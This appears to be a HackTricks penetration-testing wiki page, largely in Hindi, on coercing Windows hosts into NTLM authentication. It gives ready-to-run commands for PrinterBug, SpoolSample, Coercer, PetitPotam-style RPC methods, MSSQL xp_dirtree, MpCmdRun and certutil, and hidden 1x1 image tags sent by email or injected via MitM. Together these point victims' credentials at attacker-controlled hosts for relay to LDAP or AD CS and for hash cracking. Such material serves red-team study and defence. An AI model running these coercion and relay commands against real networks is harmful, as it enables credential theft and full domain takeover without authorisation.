# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) **C# में MIDL compiler का उपयोग करके coded remote authentication triggers का एक collection** है, जो 3rd party dependencies से बचने के लिए बनाया गया है।

## Spooler Service Abuse

अगर _**Print Spooler**_ service **enabled** है, तो आप कुछ पहले से known AD credentials का उपयोग करके Domain Controller के print server से नए print jobs पर **update request** कर सकते हैं और बस उसे **notification किसी system को send करने** के लिए कह सकते हैं।\
ध्यान दें कि जब printer notification किसी arbitrary systems को send करता है, तो उसे उस **system के against authenticate** करना पड़ता है। इसलिए, attacker _**Print Spooler**_ service को किसी arbitrary system के against authenticate करने के लिए मजबूर कर सकता है, और service इस authentication में **computer account** का उपयोग करेगी।

Under the hood, classic **PrinterBug** primitive **`\\PIPE\\spoolss`** पर **`RpcRemoteFindFirstPrinterChangeNotificationEx`** का abuse करता है। attacker पहले एक printer/server handle खोलता है और फिर `pszLocalMachine` में fake client name देता है, ताकि target spooler **attacker-controlled host की ओर back** एक notification channel बनाता है। यही कारण है कि इसका effect direct code execution नहीं, बल्कि **outbound authentication coercion** है।\
अगर आप spooler में ही **RCE/LPE** ढूंढ रहे हैं, तो [PrintNightmare](printnightmare.md) देखें। यह page **coercion and relay** पर focused है।

### Finding Windows Servers on the domain

PowerShell का उपयोग करके, Windows boxes की list प्राप्त करें। Servers आमतौर पर priority होते हैं, इसलिए वहीं focus करें:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler सेवाओं को सुनते हुए ढूँढना

थोड़ा संशोधित @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) का उपयोग करके देखें कि Spooler Service listening है या नहीं:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
आप Linux पर `rpcdump.py` का भी उपयोग कर सकते हैं और **MS-RPRN** protocol को देख सकते हैं:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
या Linux से **NetExec/CrackMapExec** के साथ hosts को जल्दी test करें:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
यदि आप सिर्फ यह जाँचने के बजाय **coercion surfaces** को enumerate करना चाहते हैं कि spooler endpoint मौजूद है या नहीं, तो **Coercer scan mode** का उपयोग करें:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
यह उपयोगी है क्योंकि EPM में endpoint देखना केवल यह बताता है कि print RPC interface registered है। यह **यह गारंटी नहीं देता** कि हर coercion method आपके current privileges के साथ reachable है या कि host एक usable authentication flow emit करेगा।

### सेवा से कहें कि वह एक arbitrary host के खिलाफ authenticate करे

आप [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket) को compile कर सकते हैं।
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
या [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) का उपयोग करें यदि आप Linux पर हैं
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
With **Coercer**, आप spooler interfaces को सीधे target कर सकते हैं और यह अनुमान लगाने से बच सकते हैं कि कौन सा RPC method exposed है:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### WebClient के साथ SMB के बजाय HTTP को मजबूर करना

Classic PrinterBug आमतौर पर `\\attacker\share` पर एक **SMB** authentication देता है, जो अभी भी **capture**, **HTTP targets पर relay** या **SMB signing absent** होने पर **relay** के लिए उपयोगी है।\
हालांकि, modern environments में, **SMB to SMB** relay अक्सर **SMB signing** के कारण blocked होता है, इसलिए operators अक्सर इसके बजाय **HTTP/WebDAV** authentication को मजबूर करना पसंद करते हैं।

अगर target पर **WebClient** service चल रही है, तो listener को ऐसे form में specify किया जा सकता है जिससे Windows **WebDAV over HTTP** use करे:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
यह विशेष रूप से तब उपयोगी है जब इसे **`ntlmrelayx --adcs`** या अन्य HTTP relay targets के साथ chain किया जाए, क्योंकि यह coerced connection पर SMB relayability पर निर्भर नहीं करता। महत्वपूर्ण caveat यह है कि HTTP/WebDAV variant के काम करने के लिए victim पर **WebClient must be running** होना चाहिए।

### Combining with Unconstrained Delegation

यदि attacker ने पहले से [Unconstrained Delegation](unconstrained-delegation.md) वाला कोई computer compromise कर लिया है, तो attacker **printer को इस computer के खिलाफ authenticate कराने** के लिए मजबूर कर सकता है। Unconstrained delegation के कारण, printer के **computer account** का **TGT** उस computer की **memory** में **save** हो जाएगा जिसमें unconstrained delegation है। चूंकि attacker ने पहले से ही इस host को compromise कर लिया है, वह **इस ticket को retrieve** कर सकेगा और इसका abuse कर सकेगा ([Pass the Ticket](pass-the-ticket.md))।

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.\
For spooler abuse, **MS-RPRN opnum 65** remains the most common and best-documented primitive because the protocol specification explicitly states that the server creates a notification channel back to the client specified by `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: target दिए गए backup log path को open करने की कोशिश करता है और attacker-controlled UNC पर authenticate करता है।
- Practical use: Tier 0 assets (DC/RODC/Citrix/etc.) को coerced करके NetNTLM emit कराना, फिर AD CS endpoints (ESC8/ESC11 scenarios) या अन्य privileged services पर relay करना।

## PrivExchange

`PrivExchange` attack **Exchange Server `PushSubscription` feature** में पाई गई एक flaw का परिणाम है। यह feature किसी भी domain user जिसके पास mailbox हो, उसे Exchange server को किसी भी client-provided host पर HTTP के जरिए authenticate कराने के लिए मजबूर करने की अनुमति देती है।

By default, **Exchange service runs as SYSTEM** और उसे अत्यधिक privileges दिए जाते हैं (विशेष रूप से, **domain pre-2019 Cumulative Update** पर इसके पास **WriteDacl privileges** होते हैं)। इस flaw का exploit करके **LDAP पर relaying** सक्षम किया जा सकता है और बाद में **domain NTDS database** निकाली जा सकती है। जब LDAP पर relaying संभव न हो, तब भी इस flaw का उपयोग domain के भीतर अन्य hosts पर relay और authenticate करने के लिए किया जा सकता है। इस attack का सफल exploitation किसी भी authenticated domain user account के साथ तुरंत Domain Admin access देता है।

## Inside Windows

यदि आप पहले से Windows machine के अंदर हैं, तो आप privileged accounts का उपयोग करके Windows को server से connect करने के लिए मजबूर कर सकते हैं:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
या इस दूसरी technique का उपयोग करें: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin (Microsoft-signed binary) का उपयोग करके NTLM authentication को coerce करना संभव है:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

अगर आपको उस user का **email address** पता है जो उस machine में log in करता है जिसे आप compromise करना चाहते हैं, तो आप उसे बस **1x1 image** वाला एक **email** भेज सकते हैं, जैसे
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
और जब वह इसे खोलता है, तो वह authenticate करने की कोशिश करेगा।

### MitM

अगर आप किसी computer पर MitM attack कर सकते हैं और उस page में HTML inject कर सकते हैं जिसे वह देखेगा, तो आप page में निम्नलिखित की तरह एक image inject करने की कोशिश कर सकते हैं:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authentication को force और phish करने के अन्य तरीके


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 को crack करना

अगर आप [NTLMv1 challenges capture कर सकते हैं तो उन्हें crack कैसे करें यहाँ पढ़ें](../ntlm/index.html#ntlmv1-attack)।\
_याद रखें कि NTLMv1 को crack करने के लिए आपको Responder challenge को "1122334455667788" पर set करना होगा_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
